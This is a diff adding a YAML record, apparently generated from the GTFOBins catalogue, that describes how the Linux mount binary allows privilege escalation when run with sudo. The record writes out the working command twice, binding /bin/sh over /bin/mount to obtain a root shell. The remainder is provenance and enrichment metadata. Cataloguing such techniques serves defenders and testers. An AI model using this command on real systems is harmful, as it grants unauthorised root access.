@@ -1,0 +1,73 @@
+id: gtfobins/mount/privilege-escalation/sudo
+type: binary
+platform: linux
+name: mount
+phases:
+- privilege-escalation
+capabilities:
+- privilege-escalation
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'mount -o bind /bin/sh /bin/mount
+
+    mount'
+  comment: This overrides `mount` itself with a shell (or any other executable).
+references:
+- https://gtfobins.github.io/gtfobins/mount/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        mount:
+          functions:
+            privilege-escalation:
+            - code: 'mount -o bind /bin/sh /bin/mount
+
+                mount'
+              comment: This overrides `mount` itself with a shell (or any other executable).
+              contexts:
+                sudo: null
+    upstream_url: https://gtfobins.github.io/gtfobins/mount/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:addfc14e67077b1e3d896e057d5dd4e12f15494d15ca9fb9149339a5f8dc53cb
